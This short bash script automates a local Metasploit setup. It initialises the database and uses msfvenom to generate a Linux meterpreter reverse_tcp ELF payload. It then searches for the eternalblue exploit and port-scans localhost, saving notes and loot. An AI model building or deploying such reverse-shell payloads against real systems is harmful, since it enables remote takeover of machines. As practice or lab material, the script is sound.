#!/bin/bash

echo Start PostgreSQL / MÃ©tasploit Database
sudo systemctl start postgresql
sudo msfdb init --non-interactive

echo Generate ELF Payload
LHOST=$(hostname -I | awk '{print $1}')
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o payload.elf
echo done

echo Start
msfconsole -q -x "
echo 'Search DB status';
db_status;
search eternalblue;
echo 'done';

echo 'Scan localhost ports';
use auxiliary/scanner/portscan/tcp;
set RHOSTS 127.0.0.1;
set PORTS 22,80,443,5432;
run;
echo 'done';

echo 'Save notes and loot';
notes -a 127.0.0.1 -t 'Project' -n 'Setup, Payload, and Scan complete';
loot -a 127.0.0.1 -d 'Scan Results' -n 'ports.txt' -t 'text' 'Local ports scanned';
echo 'done';

echo 'Export notes and loot to CSV';
loot -t csv;
echo 'done';

echo 'Exit and save session';
notes -o notes.csv;
exit
"

echo All tasks completed !
